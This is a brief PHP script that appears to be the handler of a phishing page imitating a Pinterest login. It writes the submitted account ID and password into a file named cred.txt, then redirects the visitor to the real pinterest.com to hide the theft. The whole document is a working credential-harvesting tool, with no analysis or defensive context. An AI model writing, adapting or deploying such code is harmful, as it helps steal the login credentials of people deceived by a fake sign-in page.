<?php

file_put_contents("cred.txt", "Account: " . $_POST['id'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://pinterest.com');
exit();
